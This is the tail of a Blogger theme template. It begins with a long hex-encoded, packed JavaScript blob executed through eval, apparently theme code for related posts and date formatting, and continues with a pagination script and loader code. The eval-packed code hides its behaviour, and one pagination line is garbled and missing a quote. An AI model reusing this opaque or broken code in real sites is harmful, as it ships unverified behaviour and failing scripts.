75\x7c\x36\x37\x7c\x36\x38\x7c\x36\x61\x7c\x38\x42\x7c\x38\x44\x7c\x35\x59\x7c\x38\x45\x7c\x38\x46\x7c\x38\x47\x7c\x38\x48\x7c\x7c\x35\x58\x7c\x38\x49\x7c\x38\x43\x7c\x36\x32\x7c\x38\x73\x7c\x38\x6b\x7c\x38\x72\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x37\x33\x7c\x38\x64\x7c\x38\x65\x7c\x38\x66\x7c\x38\x67\x7c\x38\x68\x7c\x36\x39\x7c\x38\x69\x7c\x38\x63\x7c\x38\x6a\x7c\x38\x6c\x7c\x38\x6d\x7c\x38\x6e\x7c\x38\x30\x7c\x38\x6f\x7c\x38\x70\x7c\x37\x72\x7c\x38\x36\x7c\x38\x62\x7c\x37\x73\x7c\x36\x49\x7c\x37\x71\x7c\x36\x72\x7c\x38\x38\x7c\x36\x73\x7c\x37\x32\x7c\x36\x74\x7c\x36\x75\x7c\x36\x76\x7c\x36\x77\x7c\x36\x71\x7c\x39\x34\x7c\x39\x32\x7c\x36\x78\x7c\x36\x7a\x7c\x36\x41\x7c\x36\x42\x7c\x36\x43\x7c\x36\x44\x7c\x38\x37\x7c\x36\x45\x7c\x36\x46\x7c\x36\x34\x7c\x36\x79\x7c\x36\x6f\x7c\x36\x68\x7c\x36\x62\x7c\x36\x63\x7c\x37\x30\x7c\x37\x34\x7c\x36\x64\x7c\x36\x31\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x36\x35\x7c\x36\x65\x7c\x36\x67\x7c\x36\x6e\x7c\x38\x33\x7c\x36\x69\x7c\x36\x6a\x7c\x36\x6b\x7c\x36\x6c\x7c\x37\x31\x7c\x36\x6d\x7c\x36\x47\x7c\x36\x70\x7c\x36\x48\x7c\x37\x61\x7c\x37\x63\x7c\x38\x39\x7c\x37\x64\x7c\x37\x65\x7c\x37\x66\x7c\x37\x67\x7c\x37\x68\x7c\x37\x62\x7c\x37\x38\x7c\x37\x69\x7c\x37\x6b\x7c\x37\x6c\x7c\x38\x32\x7c\x37\x6d\x7c\x38\x31\x7c\x37\x39\x7c\x37\x6e\x7c\x35\x5a\x7c\x39\x30\x7c\x38\x34\x7c\x37\x6f\x7c\x37\x70\x7c\x39\x35\x7c\x39\x31\x7c\x39\x33\x7c\x37\x6a\x7c\x36\x5a\x7c\x36\x52\x7c\x36\x59\x7c\x36\x4b\x7c\x36\x4c\x7c\x36\x4d\x7c\x36\x4e\x7c\x36\x4f\x7c\x36\x50\x7c\x36\x4a\x7c\x36\x51\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x36\x53\x7c\x36\x54\x7c\x36\x55\x7c\x36\x56\x7c\x36\x57\x7c\x36\x58\x7c\x38\x4a\x7c\x38\x71\x7c\x37\x35\x7c\x37\x36\x7c\x37\x37\x7c\x61\x72\x7c\x61\x73\x7c\x61\x74\x7c\x61\x75\x7c\x61\x76\x7c\x61\x70\x7c\x61\x77\x7c\x61\x79\x7c\x38\x35\x7c\x61\x41\x7c\x61\x42\x7c\x61\x43\x7c\x61\x44\x7c\x61\x78\x7c\x61\x6e\x7c\x61\x38\x7c\x61\x6d\x7c\x61\x6c\x7c\x61\x6b\x7c\x61\x67\x7c\x61\x66\x7c\x61\x63\x7c\x61\x62\x7c\x61\x61\x7c\x61\x39\x7c\x61\x45\x7c\x61\x46\x7c\x36\x36\x7c\x61\x59\x7c\x61\x5a\x7c\x62\x30\x7c\x39\x39\x7c\x61\x58\x7c\x62\x33\x7c\x62\x32\x7c\x62\x31\x7c\x39\x36\x7c\x39\x37\x7c\x61\x57\x7c\x61\x48\x7c\x61\x56\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x61\x55\x7c\x61\x54\x7c\x61\x53\x7c\x39\x38\x7c\x61\x52\x7c\x61\x51\x7c\x61\x4f\x7c\x61\x4e\x7c\x61\x4d\x7c\x61\x4c\x7c\x61\x4b\x7c\x61\x49\x7c\x61\x6f\x7c\x39\x77\x7c\x61\x35\x7c\x39\x66\x7c\x39\x67\x7c\x39\x68\x7c\x39\x69\x7c\x39\x65\x7c\x39\x6c\x7c\x39\x6e\x7c\x39\x6f\x7c\x39\x70\x7c\x39\x72\x7c\x36\x33\x7c\x39\x6d\x7c\x39\x63\x7c\x36\x30\x7c\x39\x62\x7c\x38\x4f\x7c\x38\x50\x7c\x38\x51\x7c\x38\x53\x7c\x38\x4d\x7c\x38\x54\x7c\x38\x56\x7c\x38\x57\x7c\x38\x58\x7c\x38\x5a\x7c\x39\x61\x7c\x39\x75\x7c\x39\x64\x7c\x39\x76\x7c\x39\x51\x7c\x39\x52\x7c\x38\x4c\x7c\x39\x55\x7c\x39\x56\x7c\x39\x50\x7c\x39\x57\x7c\x39\x59\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x39\x5a\x7c\x61\x30\x7c\x61\x31\x7c\x61\x32\x7c\x61\x33\x7c\x61\x34\x7c\x39\x46\x7c\x39\x4d\x7c\x39\x79\x7c\x39\x7a\x7c\x39\x41\x7c\x39\x42\x7c\x39\x43\x7c\x39\x44\x7c\x39\x78\x7c\x39\x45\x7c\x39\x47\x7c\x39\x48\x7c\x39\x49\x7c\x39\x4a\x7c\x39\x4b\x7c\x39\x4c\x7c\x61\x47\x7c\x61\x37\x7c\x39\x58\x7c\x39\x54\x7c\x39\x53\x7c\x39\x4f\x7c\x38\x59\x7c\x38\x52\x7c\x38\x4e\x7c\x38\x55\x7c\x39\x74\x7c\x39\x73\x7c\x39\x71\x7c\x39\x6b\x7c\x39\x6a\x7c\x61\x36\x7c\x61\x4a\x7c\x61\x50\x7c\x39\x4e\x7c\x61\x64\x7c\x61\x65\x7c\x61\x68\x7c\x61\x69\x7c\x61\x6a\x7c\x61\x7a\x7c\x61\x71\x7c\x37\x52\x5c\x27\x2e\x36\x66\x28\x5c\x27\x7c\x5c\x27\x29\x29\x29\x27\x2c\x36\x32\x2c\x36\x38\x36\x2c\x27\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x72\x65\x74\x75\x72\x6e\x7c\x66\x75\x6e\x63\x74\x69\x6f\x6e\x7c\x70\x61\x72\x73\x65\x49\x6e\x74\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x69\x66\x7c\x78\x34\x38\x7c\x78\x33\x37\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x36\x7c\x78\x34\x46\x7c\x73\x70\x6c\x69\x74\x7c\x78\x34\x32\x7c\x73\x75\x63\x63\x65\x73\x73\x7c\x64\x61\x74\x61\x54\x79\x70\x65\x7c\x62\x72\x65\x61\x6b\x7c\x78\x32\x31\x7c\x31\x30\x30\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x37\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x65\x7c\x75\x72\x6c\x7c\x78\x34\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x31\x7c\x78\x32\x33\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x33\x7c\x78\x34\x44\x7c\x78\x34\x43\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x39\x7c\x78\x33\x35\x7c\x78\x32\x43\x7c\x74\x79\x70\x65\x7c\x78\x35\x33\x7c\x6e\x6f\x5f\x69\x6d\x61\x67\x65\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x66\x7c\x64\x6f\x63\x75\x6d\x65\x6e\x74\x7c\x78\x37\x41\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x63\x7c\x31\x30\x35\x7c\x78\x34\x39\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x33\x7c\x66\x6f\x72\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x66\x7c\x31\x35\x32\x7c\x31\x34\x39\x7c\x31\x34\x37\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x66\x7c\x78\x32\x39\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x34\x7c\x31\x35\x33\x7c\x31\x34\x36\x7c\x4d\x61\x74\x68\x7c\x78\x32\x34\x7c\x32\x30\x35\x7c\x77\x69\x6e\x64\x6f\x77\x7c\x31\x30\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x61\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x37\x7c\x31\x34\x38\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x65\x7c\x78\x32\x36\x7c\x78\x33\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x32\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x35\x7c\x31\x35\x35\x7c\x78\x34\x45\x7c\x31\x33\x30\x7c\x78\x33\x46\x7c\x31\x35\x31\x7c\x78\x34\x35\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x62\x7c\x78\x37\x31\x7c\x6d\x6f\x6e\x74\x68\x5f\x66\x6f\x72\x6d\x61\x74\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x39\x7c\x31\x31\x32\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x35\x7c\x78\x33\x33\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x63\x7c\x78\x37\x32\x7c\x78\x33\x44\x7c\x78\x37\x35\x7c\x78\x32\x46\x7c\x78\x33\x45\x7c\x78\x33\x43\x7c\x78\x32\x32\x7c\x78\x36\x44\x7c\x78\x32\x44\x7c\x78\x37\x30\x7c\x78\x36\x45\x7c\x78\x36\x34\x7c\x78\x36\x33\x7c\x78\x32\x30\x7c\x78\x36\x43\x7c\x78\x36\x39\x7c\x78\x36\x38\x7c\x52\x65\x67\x45\x78\x70\x7c\x53\x74\x72\x69\x6e\x67\x7c\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x7c\x74\x6f\x53\x74\x72\x69\x6e\x67\x7c\x77\x68\x69\x6c\x65\x7c\x72\x65\x70\x6c\x61\x63\x65\x7c\x6e\x65\x77\x7c\x31\x31\x34\x7c\x78\x36\x46\x7c\x33\x36\x39\x7c\x5f\x30\x78\x63\x33\x38\x33\x7c\x78\x36\x31\x7c\x78\x37\x34\x7c\x78\x37\x33\x7c\x78\x36\x35\x7c\x76\x61\x72\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x78\x37\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x34\x7c\x78\x35\x34\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x31\x7c\x78\x34\x33\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x38\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x35\x7c\x78\x33\x32\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x64\x7c\x78\x36\x41\x7c\x78\x37\x38\x7c\x78\x35\x30\x7c\x78\x33\x31\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x34\x7c\x78\x34\x31\x7c\x78\x37\x44\x7c\x78\x33\x30\x7c\x78\x33\x42\x7c\x78\x32\x45\x7c\x78\x37\x37\x7c\x78\x36\x37\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x7c\x78\x36\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x37\x7c\x78\x36\x32\x7c\x78\x35\x46\x7c\x78\x32\x37\x7c\x78\x36\x42\x7c\x78\x37\x39\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x38\x7c\x74\x68\x69\x73\x7c\x78\x33\x41\x7c\x65\x6c\x73\x65\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x38\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x33\x32\x7c\x65\x76\x61\x6c\x7c\x31\x34\x30\x7c\x31\x36\x34\x7c\x31\x39\x31\x7c\x31\x33\x37\x7c\x31\x37\x32\x7c\x31\x36\x38\x7c\x31\x38\x36\x7c\x31\x36\x37\x7c\x31\x36\x36\x7c\x31\x39\x32\x7c\x31\x36\x35\x7c\x31\x37\x31\x7c\x31\x36\x39\x7c\x31\x38\x35\x7c\x31\x37\x35\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x31\x37\x36\x7c\x78\x33\x38\x7c\x78\x35\x36\x7c\x31\x37\x33\x7c\x31\x39\x30\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x30\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x33\x31\x7c\x31\x32\x34\x7c\x69\x6e\x7c\x31\x34\x31\x7c\x62\x5f\x72\x63\x7c\x31\x32\x33\x7c\x78\x34\x42\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x33\x30\x7c\x32\x35\x30\x7c\x78\x34\x30\x7c\x31\x38\x37\x7c\x78\x35\x31\x7c\x31\x38\x38\x7c\x31\x38\x39\x7c\x31\x37\x34\x7c\x31\x37\x30\x7c\x31\x38\x34\x7c\x32\x30\x32\x7c\x32\x30\x30\x7c\x33\x30\x30\x30\x7c\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c\x7c\x31\x39\x39\x7c\x31\x39\x37\x7c\x31\x39\x38\x7c\x32\x30\x34\x7c\x31\x38\x30\x7c\x32\x30\x38\x7c\x32\x30\x39\x7c\x32\x30\x37\x7c\x32\x30\x36\x7c\x32\x30\x33\x7c\x31\x39\x35\x7c\x31\x37\x37\x7c\x31\x32\x32\x7c\x31\x37\x38\x7c\x32\x31\x30\x7c\x31\x36\x32\x7c\x31\x36\x31\x7c\x31\x37\x39\x7c\x72\x65\x6c\x61\x74\x65\x64\x5f\x6e\x75\x6d\x62\x65\x72\x7c\x31\x31\x31\x7c\x31\x33\x38\x7c\x31\x33\x36\x7c\x31\x38\x33\x7c\x31\x34\x32\x7c\x31\x34\x33\x7c\x31\x36\x30\x7c\x31\x36\x33\x7c\x31\x35\x36\x7c\x31\x35\x34\x7c\x31\x34\x34\x7c\x31\x33\x32\x7c\x31\x32\x36\x7c\x31\x38\x31\x7c\x31\x38\x32\x7c\x31\x31\x30\x7c\x31\x31\x39\x7c\x31\x39\x36\x7c\x31\x30\x34\x7c\x31\x32\x31\x7c\x31\x32\x38\x7c\x31\x32\x30\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x39\x7c\x31\x31\x38\x7c\x31\x31\x36\x7c\x31\x33\x31\x7c\x31\x30\x38\x7c\x31\x31\x35\x7c\x78\x35\x35\x7c\x31\x39\x33\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x36\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x65\x7c\x31\x33\x33\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x32\x7c\x78\x32\x35\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x33\x7c\x78\x37\x42\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x64\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x61\x7c\x78\x35\x37\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x30\x7c\x31\x33\x34\x7c\x6e\x61\x76\x46\x6f\x72\x6d\x56\x61\x6c\x75\x65\x7c\x31\x30\x37\x7c\x31\x35\x38\x7c\x78\x34\x34\x7c\x78\x32\x38\x7c\x78\x35\x39\x7c\x31\x39\x34\x7c\x31\x31\x33\x7c\x31\x33\x35\x7c\x31\x32\x39\x7c\x31\x33\x39\x7c\x31\x35\x39\x7c\x31\x35\x37\x7c\x31\x34\x35\x7c\x31\x35\x30\x7c\x31\x32\x35\x7c\x78\x33\x39\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x61\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x31\x62\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x64\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x62\x7c\x5f\x30\x78\x39\x30\x65\x61\x78\x32\x63\x7c\x78\x33\x34\x7c\x31\x30\x39\x7c\x31\x30\x33\x7c\x31\x30\x32\x7c\x31\x30\x31\x7c\x31\x32\x37\x7c\x31\x31\x37\x7c\x32\x30\x31\x27\x2e\x73\x70\x6c\x69\x74\x28\x27\x7c\x27\x29\x2c\x30\x2c\x7b\x7d\x29\x29\x0a";eval(_b74vix);
  //]]>
</script>

<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<b:if cond='data:blog.pageType!= &quot;item&quot;'>
<b:if cond='data:blog.pageType != &quot;error_page&quot;'>
<style>
article {
    padding:0;
}
.post-header {
    padding:0;
}
@media only screen and (max-width: 768px) {
article {
    padding:10px;
}
  }
</style>
<!--Page Navigation Starts-->
<script type='text/javascript'>
  /*<![CDATA[*/
    var perPage=8;
    var numPages=6;
    var firstText ='First';
    var lastText ='Last';
    var prevText ='ˠPrevious';
    var nextText ='Next ۧ;
    var urlactivepage=location.href;
    var home_page="/";
  /*]]>*/
</script>
<script type='text/javascript'>
 /*<![CDATA[*/
  if (typeof firstText == "undefined") firstText = "First";
  if (typeof lastText == "undefined") lastText = "Last";
  var noPage;
  var currentPage;
  var currentPageNo;
  var postLabel;
  pagecurrentg();

  function looppagecurrentg(pageInfo) {
      var html = '';
      pageNumber = parseInt(numPages / 2);
      if (pageNumber == numPages - pageNumber) {
          numPages = pageNumber * 2 + 1
      }
      pageStart = currentPageNo - pageNumber;
      if (pageStart < 1) pageStart = 1;
      lastPageNo = parseInt(pageInfo / perPage) + 1;
      if (lastPageNo - 1 == pageInfo / perPage) lastPageNo = lastPageNo - 1;
      pageEnd = pageStart + numPages - 1;
      if (pageEnd > lastPageNo) pageEnd = lastPageNo;
      html += "<span class='showpageOf'>Page " + currentPageNo + ' of ' + lastPageNo + "</span>";
      var prevNumber = parseInt(currentPageNo) - 1;

      //Iccsi was here, doing magic      
      if (currentPageNo > 1) {
          if (currentPage == "page") {
              html += '<span class="showpage firstpage"><a href="' + home_page + '">' + firstText + '</a></span>'
          } else {
              html += '<span class="displaypageNum firstpage"><a href="/search/label/' + postLabel + '?&max-results=' + perPage + '">' + firstText + '</a></span>'
          }
      }

      if (currentPageNo > 2) {
          if (currentPageNo == 3) {
              if (currentPage == "page") {
                  html += '<span class="showpage"><a href="' + home_page + '">' + prevText + '</a></span>'
              } else {
                  html += '<span class="displaypageNum"><a href="/search/label/' + postLabel + '?&max-results=' + perPage + '">' + prevText + '</a></span>'
              }
          } else {
              if (currentPage == "page") {
                  html += '<span class="displaypageNum"><a href="#" onclick="redirectpage(' + prevNumber + ');return false">' + prevText + '</a></span>'
              } else {
                  html += '<span class="displaypageNum"><a href="#" onclick="redirectlabel(' + prevNumber + ');return false">' + prevText + '</a></span>'
              }
          }
      }
      if (pageStart > 1) {
          if (currentPage == "page") {
              html += '<span class="displaypageNum"><a href="' + home_page + '">1</a></span>'
          } else {
              html += '<span class="displaypageNum"><a href="/search/label/' + postLabel + '?&max-results=' + perPage + '">1</a></span>'
          }
      }
      if (pageStart > 2) {
          html += ' ... '
      }
      for (var jj = pageStart; jj <= pageEnd; jj++) {
          if (currentPageNo == jj) {
              html += '<span class="pagecurrent">' + jj + '</span>'
          } else if (jj == 1) {
              if (currentPage == "page") {
                  html += '<span class="displaypageNum"><a href="' + home_page + '">1</a></span>'
              } else {
                  html += '<span class="displaypageNum"><a href="/search/label/' + postLabel + '?&max-results=' + perPage + '">1</a></span>'
              }
          } else {
              if (currentPage == "page") {
                  html += '<span class="displaypageNum"><a href="#" onclick="redirectpage(' + jj + ');return false">' + jj + '</a></span>'
              } else {
                  html += '<span class="displaypageNum"><a href="#" onclick="redirectlabel(' + jj + ');return false">' + jj + '</a></span>'
              }
          }
      }
      if (pageEnd < lastPageNo - 1) {
          html += '...'
      }
      if (pageEnd < lastPageNo) {
          if (currentPage == "page") {
              html += '<span class="displaypageNum"><a href="#" onclick="redirectpage(' + lastPageNo + ');return false">' + lastPageNo + '</a></span>'
          } else {
              html += '<span class="displaypageNum"><a href="#" onclick="redirectlabel(' + lastPageNo + ');return false">' + lastPageNo + '</a></span>'
          }
      }


      var nextnumber = parseInt(currentPageNo) + 1;
      if (currentPageNo < (lastPageNo - 1)) {
          if (currentPage == "page") {
              html += '<span class="displaypageNum"><a href="#" onclick="redirectpage(' + nextnumber + ');return false">' + nextText + '</a></span>'
          } else {
              html += '<span class="displaypageNum"><a href="#" onclick="redirectlabel(' + nextnumber + ');return false">' + nextText + '</a></span>'
          }
      }

      if (currentPageNo < lastPageNo) {
          //Iccsi was here, doing magic
          if (currentPage == "page") {
              html += '<span class="displaypageNum lastpage"><a href="#" onclick="redirectpage(' + lastPageNo + ');return false">' + lastText + '</a></span>'
          } else {
              html += '<span class="displaypageNum lastpage"><a href="#" onclick="redirectlabel(' + lastPageNo + ');return false">' + lastText + '</a></span>'
          }
      }

      var pageArea = document.getElementsByName("pageArea");
      var blogPager = document.getElementById("blog-pager");
      for (var p = 0; p < pageArea.length; p++) {
          pageArea[p].innerHTML = html
      }
      if (pageArea && pageArea.length > 0) {
          html = ''
      }
      if (blogPager) {
          blogPager.innerHTML = html
      }
  }

  function totalcountdata(root) {
      var feed = root.feed;
      var totaldata = parseInt(feed.openSearch$totalResults.$t, 10);
      looppagecurrentg(totaldata)
  }

  function pagecurrentg() {
      var thisUrl = urlactivepage;
      if (thisUrl.indexOf("/search/label/") != -1) {
          if (thisUrl.indexOf("?updated-max") != -1) {
              postLabel = thisUrl.substring(thisUrl.indexOf("/search/label/") + 14, thisUrl.indexOf("?updated-max"))
          } else {
              postLabel = thisUrl.substring(thisUrl.indexOf("/search/label/") + 14, thisUrl.indexOf("?&max"))
          }
      }
      if (thisUrl.indexOf("?q=") == -1 && thisUrl.indexOf(".html") == -1) {
          if (thisUrl.indexOf("/search/label/") == -1) {
              currentPage = "page";
              if (urlactivepage.indexOf("#PageNo=") != -1) {
                  currentPageNo = urlactivepage.substring(urlactivepage.indexOf("#PageNo=") + 8, urlactivepage.length)
              } else {
                  currentPageNo = 1
              }
              document.write("<script src=\"" + home_page + "feeds/posts/summary?max-results=1&alt=json-in-script&callback=totalcountdata\"><\/script>")
          } else {
              currentPage = "label";
              if (thisUrl.indexOf("&max-results=") == -1) {
                  perPage = 20
              }
              if (urlactivepage.indexOf("#PageNo=") != -1) {
                  currentPageNo = urlactivepage.substring(urlactivepage.indexOf("#PageNo=") + 8, urlactivepage.length)
              } else {
                  currentPageNo = 1
              }
              document.write('<script src="' + home_page + 'feeds/posts/summary/-/' + postLabel + '?alt=json-in-script&callback=totalcountdata&max-results=1" ><\/script>')
          }
      }
  }

  function redirectpage(numberpage) {
      jsonstart = (numberpage - 1) * perPage;
      noPage = numberpage;
      var nameBody = document.getElementsByTagName('head')[0];
      var newInclude = document.createElement('script');
      newInclude.type = 'text/javascript';
      newInclude.setAttribute("src", home_page + "feeds/posts/summary?start-index=" + jsonstart + "&max-results=1&alt=json-in-script&callback=finddatepost");
      nameBody.appendChild(newInclude)
  }

  function redirectlabel(numberpage) {
      jsonstart = (numberpage - 1) * perPage;
      noPage = numberpage;
      var nameBody = document.getElementsByTagName('head')[0];
      var newInclude = document.createElement('script');
      newInclude.type = 'text/javascript';
      newInclude.setAttribute("src", home_page + "feeds/posts/summary/-/" + postLabel + "?start-index=" + jsonstart + "&max-results=1&alt=json-in-script&callback=finddatepost");
      nameBody.appendChild(newInclude)
  }

  function finddatepost(root) {
          post = root.feed.entry[0];
          var timestamp1 = post.published.$t.substring(0, 19) + post.published.$t.substring(23, 29);
          var timestamp = encodeURIComponent(timestamp1);
          if (currentPage == "page") {
              var pAddress = "/search?updated-max=" + timestamp + "&max-results=" + perPage + "#PageNo=" + noPage
          } else {
              var pAddress = "/search/label/" + postLabel + "?updated-max=" + timestamp + "&max-results=" + perPage + "#PageNo=" + noPage
          }
          location.href = pAddress
      }
      /*]]>*/
</script>
</b:if>
</b:if>
</b:if>
<!--Page Navigation Ends -->
<script type='text/javascript'>
 /*<![CDATA[*/
$(window).bind("load", function () {
    jQuery("#status").fadeOut("slow");
    jQuery("#loader").delay(0).fadeOut();
});
  /*]]>*/
</script>
</body>
</html>